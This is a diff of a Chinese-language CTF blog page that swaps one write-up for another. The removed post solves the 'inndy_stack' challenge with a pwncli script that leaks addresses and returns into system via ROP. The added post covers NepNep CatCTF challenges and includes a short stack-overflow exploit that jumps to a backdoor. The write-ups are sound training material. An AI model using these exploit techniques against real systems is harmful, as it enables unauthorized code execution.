@@ -16,31 +16,25 @@
   <meta name="author" content="SayNOW">
   <meta name="keywords" content="">
   
-    <meta name="description" content="分析  32位,保护全开    实现了一个简单的栈    pop    push  思路 v6[0]是当前栈指针（esp），可以通过pop向后移动再push修改使其指向ret addr 可以通过pop泄露程序地址、栈地址和libc地址 泄露libc地址后ROP  Exp12345678910111213141516171819202122232425262728293031323334353637">
+    <meta name="description" content="PWNwelcome_CAT_CTF分析 给了一个server文件和client文件 client要求输入ip和port，然后进入一个地图界面  思路 猜测远程跑在server，直接ida动调，patch本地的client，然后直接拿远程的flag  bitcoin分析 C++程序，login输入用户名和密码时可溢出 Block构造函数会读写flag  思路 直接栈溢出返回到后门 需要注意的是me">
 <meta property="og:type" content="article">
-<meta property="og:title" content="inndy_stack">
-<meta property="og:url" content="http://www.willtakeittoten.xyz/2022/12/10/inndy-stack/index.html">
+<meta property="og:title" content="NepNep_Catctf_wp">
+<meta property="og:url" content="http://www.willtakeittoten.xyz/2023/01/02/NepNep-Catctf-wp/index.html">
 <meta property="og:site_name" content="SayNOW">
-<meta property="og:description" content="分析  32位,保护全开    实现了一个简单的栈    pop    push  思路 v6[0]是当前栈指针（esp），可以通过pop向后移动再push修改使其指向ret addr 可以通过pop泄露程序地址、栈地址和libc地址 泄露libc地址后ROP  Exp12345678910111213141516171819202122232425262728293031323334353637">
+<meta property="og:description" content="PWNwelcome_CAT_CTF分析 给了一个server文件和client文件 client要求输入ip和port，然后进入一个地图界面  思路 猜测远程跑在server，直接ida动调，patch本地的client，然后直接拿远程的flag  bitcoin分析 C++程序，login输入用户名和密码时可溢出 Block构造函数会读写flag  思路 直接栈溢出返回到后门 需要注意的是me">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://www.willtakeittoten.xyz/2022/12/10/inndy-stack/1.png">
-<meta property="og:image" content="http://www.willtakeittoten.xyz/2022/12/10/inndy-stack/2.png">
-<meta property="og:image" content="http://www.willtakeittoten.xyz/2022/12/10/inndy-stack/3.png">
-<meta property="og:image" content="http://www.willtakeittoten.xyz/2022/12/10/inndy-stack/4.png">
-<meta property="og:image" content="http://www.willtakeittoten.xyz/2022/12/10/inndy-stack/5.png">
-<meta property="article:published_time" content="2022-12-10T05:39:25.000Z">
-<meta property="article:modified_time" content="2022-12-11T07:35:30.896Z">
+<meta property="article:published_time" content="2023-01-02T07:31:15.000Z">
+<meta property="article:modified_time" content="2023-01-02T08:37:08.509Z">
 <meta property="article:author" content="SayNOW">
 <meta property="article:tag" content="CTF">
+<meta property="article:tag" content="NepNep">
+<meta property="article:tag" content="CatCtf">
 <meta property="article:tag" content="WP">
-<meta property="article:tag" content="BUU">
-<meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://www.willtakeittoten.xyz/2022/12/10/inndy-stack/1.png">
   
   
   
-  <title>inndy_stack - SayNOW</title>
+  <title>NepNep_Catctf_wp - SayNOW</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -217,7 +211,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="inndy_stack"></span>
+            <span id="subtitle" data-typed-text="NepNep_Catctf_wp"></span>
           
         </div>
 
@@ -228,8 +222,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-12-10 13:39" pubdate>
-          2022年12月10日 下午
+        <time datetime="2023-01-02 15:31" pubdate>
+          2023年1月2日 下午
         </time>
       </span>
     
@@ -240,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k 字
+          907 字
         
       </span>
     
@@ -251,7 +245,7 @@
         
         
         
-          12 分钟
+          8 分钟
         
       </span>
     
@@ -289,35 +283,31 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">inndy_stack</h1>
+            <h1 style="display: none">NepNep_Catctf_wp</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/2022/12/10/inndy-stack/1.png" srcset="/img/loading.gif" lazyload></p>
-<ul>
-<li>32位,保护全开</li>
+                <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="welcome-CAT-CTF"><a href="#welcome-CAT-CTF" class="headerlink" title="welcome_CAT_CTF"></a>welcome_CAT_CTF</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>给了一个server文件和client文件</li>
+<li>client要求输入ip和port，然后进入一个地图界面</li>
 </ul>
-<p><img src="/2022/12/10/inndy-stack/2.png" srcset="/img/loading.gif" lazyload></p>
-<ul>
-<li>实现了一个简单的栈</li>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
+<li>猜测远程跑在server，直接ida动调，patch本地的client，然后直接拿远程的flag</li>
 </ul>
-<p><img src="/2022/12/10/inndy-stack/3.png" srcset="/img/loading.gif" lazyload></p>
-<ul>
-<li>pop</li>
+<h2 id="bitcoin"><a href="#bitcoin" class="headerlink" title="bitcoin"></a>bitcoin</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>C++程序，login输入用户名和密码时可溢出</li>
+<li>Block构造函数会读写flag</li>
 </ul>
-<p><img src="/2022/12/10/inndy-stack/4.png" srcset="/img/loading.gif" lazyload></p>
-<ul>
-<li>push</li>
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ul>
+<li>直接栈溢出返回到后门</li>
+<li>需要注意的是menu函数内的bitcoin_start函数内fork了一个子程序，调试时需要设置下set follow-fork-mode parent跟父进程</li>
 </ul>
-<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul>
-<li>v6[0]是当前栈指针（esp），可以通过pop向后移动再push修改使其指向ret addr</li>
-<li>可以通过pop泄露程序地址、栈地址和libc地址</li>
-<li>泄露libc地址后ROP</li>
-</ul>
-<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># Date: 2022-12-08 14:20:13</span><br><span class="hljs-comment"># Link: https://github.com/RoderickChan/pwncli</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc</span><br><span class="hljs-comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span><br><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc: ELF = gift.libc<br><br><span class="hljs-comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span><br>CurrentGadgets.set_find_area(find_in_elf=<span class="hljs-literal">True</span>, find_in_libc=<span class="hljs-literal">False</span>, do_initial=<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">i, prompt=<span class="hljs-string">&quot;Cmd &gt;&gt;\n&quot;</span></span>):<br>    sla(prompt, i)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>():<br>    cmd(<span class="hljs-string">&#x27;p&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">d</span>):<br>    cmd(<span class="hljs-string">&#x27;i&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(d))<br><br>pop()<br>pop()<br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br><br>libc=ELF(<span class="hljs-string">&quot;../libc/libc-2.23_32.so&quot;</span>)<br><span class="hljs-comment"># libc_base-=0x1D5B73</span><br><br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br>elf_base=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>))<br>elf_base-=<span class="hljs-number">0x75a</span><br>pop()<br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br>stack=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    push(<span class="hljs-number">0x59</span>)<br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>))<br>libc_base-=<span class="hljs-number">0x18637</span><br>one=libc_base+<span class="hljs-number">0x3a80c</span><br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>push(<span class="hljs-number">16</span>)<br>push(<span class="hljs-number">16</span>)<br>push(<span class="hljs-number">16</span>)<br>push(<span class="hljs-number">16</span>)<br>push(system)<br>push(stack+<span class="hljs-number">0x78</span>)<br>push(libc_base+<span class="hljs-number">0x0015902b</span>)<br>cmd(<span class="hljs-string">&quot;x&quot;</span>)<br><span class="hljs-built_in">print</span>(libc_base)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(elf_base))<br>ia()<br><br></code></pre></td></tr></table></figure>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># Date: 2022-12-31 22:06:36</span><br><span class="hljs-comment"># Link: https://github.com/RoderickChan/pwncli</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc</span><br><span class="hljs-comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span><br><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc: ELF = gift.libc<br><br><span class="hljs-comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span><br>CurrentGadgets.set_find_area(find_in_elf=<span class="hljs-literal">True</span>, find_in_libc=<span class="hljs-literal">False</span>, do_initial=<span class="hljs-literal">False</span>)<br><br>rl()<br>rl()<br>sl()<br>ru(<span class="hljs-string">&quot;Name: &quot;</span>)<br>sl(<span class="hljs-string">&quot;aa&quot;</span>)<br>ru(<span class="hljs-string">&quot;Password: &quot;</span>)<br>stop()<br>sl(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">64</span>+p64_ex(<span class="hljs-number">0x609a00</span>)+p64_ex(<span class="hljs-number">0x0000000000404EA4</span>))<br>stop()<br>ia()<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/12/10/inndy-stack/5.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="CatFlag"><a href="#CatFlag" class="headerlink" title="CatFlag"></a>CatFlag</h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ul>
+<li>直接cat 给的附件，有flag明文</li>
+</ul>
 
                 
               </div>
@@ -341,13 +331,20 @@
   
     <span>></span>
     
-  <a href="/categories/CTF/BUU/" class="category-chain-item">BUU</a>
+  <a href="/categories/CTF/Pwn/" class="category-chain-item">Pwn</a>
   
   
     <span>></span>
     
-  <a href="/categories/CTF/BUU/Pwn/" class="category-chain-item">Pwn</a>
+  <a href="/categories/CTF/Pwn/Misc/" class="category-chain-item">Misc</a>
   
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/Misc/NepNep/" class="category-chain-item">NepNep</a>
+  
+  
+
   
 
   
@@ -367,11 +364,11 @@
       
         <a href="/tags/CTF/">#CTF</a>
       
+        <a href="/tags/NepNep/">#NepNep</a>
+      
+        <a href="/tags/CatCtf/">#CatCtf</a>
+      
         <a href="/tags/WP/">#WP</a>
-      
-        <a href="/tags/BUU/">#BUU</a>
-      
-        <a href="/tags/PWN/">#PWN</a>
       
     </div>
   
@@ -383,8 +380,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>inndy_stack</div>
-      <div>http://www.willtakeittoten.xyz/2022/12/10/inndy-stack/</div>
+      <div>NepNep_Catctf_wp</div>
+      <div>http://www.willtakeittoten.xyz/2023/01/02/NepNep-Catctf-wp/</div>
     </div>
     <div class="license-meta">
       
@@ -396,7 +393,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年12月10日</div>
+          <div>2023年1月2日</div>
         </div>
       
       
@@ -428,18 +425,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/01/02/NepNep-Catctf-wp/" title="NepNep_Catctf_wp">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">NepNep_Catctf_wp</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/12/10/arr-sun-2016/" title="arr_sun_2016">
-                        <span class="hidden-mobile">arr_sun_2016</span>
+                      <a href="/2022/12/10/inndy-stack/" title="inndy_stack">
+                        <span class="hidden-mobile">inndy_stack</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
